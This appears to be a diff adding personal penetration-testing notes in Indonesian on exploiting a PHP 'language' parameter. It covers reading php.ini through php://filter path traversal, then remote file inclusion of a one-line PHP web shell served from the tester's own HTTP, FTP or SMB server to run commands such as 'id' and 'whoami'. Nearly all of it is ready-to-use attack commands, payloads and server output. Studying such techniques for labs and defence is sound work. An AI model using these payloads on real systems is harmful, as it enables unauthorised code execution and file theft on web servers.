@@ -1,0 +1,74 @@
+# Cek PHP config
+cek apakah
+```
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+---------------------------
+// atau pake
+---------------------------
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"
+```
+
+cari hasil
+```
+allow_url_include = On
+```
+
+# Coba
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+# RCE dengan RFI
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+...
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+## tinggal diakses
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://<IP_Lokal>:<PORT_Lokal>/shell.php&cmd=id
+```
+
+nanti akan dapat
+```
+sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+...
+SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+```
+
+## FTP
+```
+sudo python -m pyftpdlib -p 21
+...
+[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
+[SNIP] concurrency model: async
+[SNIP] masquerade (NAT) address: None
+[SNIP] passive ports: None
+```
+
+bisa dicoba
+```
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+...
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+## SMB (kalo Windows)
+```
+impacket-smbserver -smb2support share $(pwd)
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+akses
+```
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
